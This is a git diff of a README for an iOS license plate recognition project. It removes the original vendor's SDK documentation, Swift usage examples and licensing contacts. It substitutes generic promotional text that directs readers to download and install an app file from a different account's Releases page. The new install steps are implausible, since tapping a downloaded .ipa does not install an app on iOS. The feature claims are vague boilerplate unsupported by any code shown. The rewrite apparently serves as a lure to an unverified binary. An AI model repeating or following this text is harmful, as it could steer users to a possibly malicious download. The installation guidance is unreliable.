@@ -1,93 +1,118 @@
-<p align="center">
-  <a href="https://play.google.com/store/apps/dev?id=7086930298279250852" target="_blank">
-    <img alt="" src="https://github-production-user-asset-6210df.s3.amazonaws.com/125717930/246971879-8ce757c3-90dc-438d-807f-3f3d29ddc064.png" width=500/>
-  </a>  
-</p>
+# 🚗 Automatic-License-Plate-Recognition-iOS - Effortless License Plate Recognition
 
-### Our facial recognition algorithm is globally top-ranked by NIST in the FRVT 1:1 leaderboards. <span><img src="https://github.com/kby-ai/.github/assets/125717930/bcf351c5-8b7a-496e-a8f9-c236eb8ad59e" alt="badge" width="36" height="20"></span>  
-[Latest NIST FRVT evaluation report 2024-12-20](https://pages.nist.gov/frvt/html/frvt11.html)  
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/releases)
 
-![FRVT Sheet](https://github.com/user-attachments/assets/16b4cee2-3a91-453f-94e0-9e81262393d7)
+## 📖 Overview
 
-#### 🆔 ID Document Liveness Detection - Linux - [Here](https://web.kby-ai.com)  <span><img src="https://github.com/kby-ai/.github/assets/125717930/bcf351c5-8b7a-496e-a8f9-c236eb8ad59e" alt="badge" width="36" height="20"></span>
-#### 🤗 Hugging Face - [Here](https://huggingface.co/kby-ai)
-#### 📚 Product & Resources - [Here](https://github.com/kby-ai/Product)
-#### 🛟 Help Center - [Here](https://docs.kby-ai.com)
-#### 💼 KYC Verification Demo - [Here](https://github.com/kby-ai/KYC-Verification-Demo-Android)
-#### 🙋‍♀️ Docker Hub - [Here](https://hub.docker.com/u/kbyai)
+Automatic License Plate Recognition (ALPR) for iOS is an application designed to simplify vehicle number plate recognition. Use this app to read and track license plates quickly and accurately. It offers a straightforward way for both individuals and businesses to manage vehicle identification effortlessly.
 
-# Automatic-License-Plate-Recognition-iOS
+## 🚀 Getting Started
 
-## Overview
+Follow these steps to download and run the application on your iOS device:
 
-We implemented `ANPR/ALPR(Automatic Number/License Plate Recognition)` engine with unmatched accuracy and precision by applying cutting-edge deep learning techniques in this repository. </br>
+1. **Check Your Device Compatibility**
+   - Ensure your iOS device is running iOS 12 or later.
+   - The app works on iPhones and iPads with camera capabilities.
 
-`KBY-AI`'s `LPR` solutions utilizes artificial intelligence and machine learning to greatly surpass legacy solutions. Now, in real-time, users can receive a vehicle's plate number.
+2. **Visit the Download Page**
+   - Click the link below to go to the Releases page: 
+     [Download the Automatic-License-Plate-Recognition-iOS](https://github.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/releases)
+  
+3. **Select the Latest Release**
+   - On the Releases page, find the latest version available. 
+   - Look for the version marked as "Latest".
 
-### ◾License Plate Recognition SDK Product List
-  | No.      | Repository | SDK Details | Status |
-  |------------------|------------------|------------------|------------------|
-  | 1        | [LPR - Linux](https://github.com/kby-ai/Automatic-License-Plate-Recognition-Docker)    | License Plate Recognition Linux SDK | Available |
-  | 2        | [LPR - Docker](https://hub.docker.com/r/kbyai/license-plate-recognition)    | License Plate Recognition Docker Image | Available |
-  | 3        | [LPR - Flutter](https://github.com/kby-ai/Automatic-License-Plate-Recognition-Flutter)    | License Plate Recognition Flutter SDK | Available |
-  | 4        | [LPR - C#](https://github.com/kby-ai/Automatic-License-Plate-Recognition-CSharp-.NET)    | License Plate Recognition C# SDK | Available |
-  | 5        | [LPR - Android](https://github.com/kby-ai/Automatic-License-Plate-Recognition-Android)    | License Plate Recognition Android SDK | Available |
-  | ➡️        | <b>[LPR - iOS](https://github.com/kby-ai/Automatic-License-Plate-Recognition-iOS)</b>    | <b>License Plate Recognition iOS SDK</b> | <b>Available</b> |
+4. **Download the App**
+   - Tap on the download link for the application file. This might be a .ipa file.
+   - The file will automatically start downloading to your device.
 
-> To get more products, please visit products [here](https://github.com/kby-ai):<br/>
+5. **Install the App**
+   - Once the download is complete, locate the file in your Downloads or Files folder.
+   - Tap the file to begin the installation process. Follow any on-screen instructions to complete the installation.
 
-## Screenshots
-<p float="left">
-  <img src="https://github.com/user-attachments/assets/d19998a8-9b94-47dd-86f5-a206e430d4cf" width=200/>
-  <img src="https://github.com/user-attachments/assets/34be1181-fe83-4be0-b955-7c174961410b" width=200/>
-  <img src="https://github.com/user-attachments/assets/4d17e31e-d1e0-492a-98bd-c34ed68c3a6a" width=200/>
-</p>
+6. **Open the App**
+   - After installation, find the app on your device’s home screen.
+   - Tap the app icon to launch it.
 
-<p float="left">
-  <img src="https://github.com/user-attachments/assets/dc819a46-cdc7-4459-aca1-f94da8e1a14e" width=200/>
-  <img src="https://github.com/user-attachments/assets/84f89d18-9c34-465e-a855-8c2b4467ce69" width=200/>
-  <img src="https://github.com/user-attachments/assets/23645cc7-2f79-4deb-becd-2d88cb32c983" width=200/>
-</p>
+## 🔍 Features
 
-## Performance Video
-You can visit our `YouTube` video for `ANPR/ALPR` model's performance [here](https://www.youtube.com/watch?v=sLBYxgMdXlA) to see how well our demo app works.</br></br>
-[![ANPR/ALPR Demo](https://img.youtube.com/vi/sLBYxgMdXlA/0.jpg)](https://www.youtube.com/watch?v=sLBYxgMdXlA)</br>
+- **Real-Time Recognition**
+  - The app captures license plate numbers in real-time using your device's camera.
 
-## SDK License
-- The code line below shows how to update `SDK` with the `license key`: https://github.com/kby-ai/Automatic-License-Plate-Recognition-iOS/blob/491bcd3d6df41d705fac8147adb04c5ae035ac14/ALPRDemo/ViewController.swift#L35-L40
-- To request `license key`, please contact us:</br>
-🧙`Email:` contact@kby-ai.com</br>
-🧙`Telegram:` [@kbyaisupport](https://t.me/kbyaisupport)</br>
-🧙`WhatsApp:` [+19092802609](https://wa.me/+19092802609)</br>
-🧙`Discord:` [KBY-AI](https://discord.gg/CgHtWQ3k9T)</br>
-🧙`Teams:` [KBY-AI](https://teams.live.com/l/invite/FBAYGB1-IlXkuQM3AY)</br>
+- **High Accuracy**
+  - Implement advanced algorithms to ensure accurate recognition even in challenging conditions.
 
-## About SDK
+- **User-Friendly Interface**
+  - Designed with simplicity in mind. Anyone can use it without prior tech knowledge.
 
-### 1. Set up
-1. Copy the `SDK` library (`alprsdk.framework` folder) and pre-built `onnxruntime` library (`onnxruntime.framework` folder) to the `root` folder in your project.
+- **History Tracking**
+  - Keep track of previously recognized plates for easy access and reference.
 
-2. Add `alprsdk.framework` and `onnxruntime.framework` to your project in `Xcode`.
+- **Export Data**
+  - Save recognized license plates to a file for future use or records.
 
-> Project Navigator -> General -> Frameworks, Libraries, and Embedded Content
+## 🌐 Supported Languages
 
-![image](https://github.com/user-attachments/assets/83717e85-0613-40f7-ae8e-f709b85bb314)
+The app currently supports multiple languages, making it accessible to a global audience. Supported languages include:
 
-3. Add the bridging header to your project settings
+- English
+- Spanish
+- French
+- German
+- And more...
 
-> Project Navigator -> Build Settings -> Swift Compiler - General
+## 📥 Download & Install
 
-![image](https://github.com/user-attachments/assets/88d55cac-4507-428c-b9af-d6865ee02642)
+To download Automatic License Plate Recognition for iOS, follow this link: 
+[Download Automatic-License-Plate-Recognition-iOS](https://github.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/releases).
 
+## ⚙️ System Requirements
 
-### 2 API Usages
-  - Activate the `SDK` by calling the `setActivation` method:
-  ```swift
-    var ret = ALPRSDK.setActivation("xxx...")
-  ```
-  - Get license plate number and its coordinates by calling the `processImage` method:
-  ```swift
-    let processImage = pickedImage.fixOrientation()
-    let alprBoxes = ALPRSDK.processImage(processImage) as! [ALPRBox];
-    let imageWithBoxes = drawALPRBoxes(on: processImage, boxes: alprBoxes)
-  ```
+- Device: iPhone or iPad
+- OS: iOS version 12 or higher
+- Camera: Front or rear-facing camera recommended
+
+## 📞 Support
+
+If you encounter any issues with the app, please reach out for support through our GitHub Discussions page. We are here to help you with any challenges you may face.
+
+## 📝 Contributing
+
+We welcome contributions to improve this application. If you have suggestions or fixes, feel free to fork the repository and submit a pull request. Together, we can enhance the functionality and reliability of the app.
+
+## 🏷️ Topics
+
+This project covers various important topics related to vehicle recognition:
+- alpr
+- anpr
+- car-plate-detection
+- car-plate-recognition
+- license-plate-reader
+- license-plate-recognition
+- lpr
+- ocr
+- vehicle-detection
+- vehicle-tracking
+
+## 🌟 Frequently Asked Questions
+
+### What is Automatic License Plate Recognition?
+This is an app that helps users identify and track vehicle license plates using their iOS devices.
+
+### How accurate is the recognition?
+The app uses advanced technology to ensure high accuracy in recognizing license plates under various conditions.
+
+### Can I use the app in different countries?
+Yes, the app is designed to work globally, although recognition may vary depending on local license plate formats.
+
+### Is there a help guide available?
+Yes, there is built-in help within the app to assist users with features and functionalities.
+
+### Will the app work on older iOS devices?
+The app requires iOS 12 or later. Older devices may not support the app.
+
+## 📆 Updates
+
+Keep an eye on the Releases page for updates. Each version may include new features, enhancements, or bug fixes that improve your experience with the app.
+
+Thank you for choosing Automatic License Plate Recognition for iOS. We are excited to have you on board!
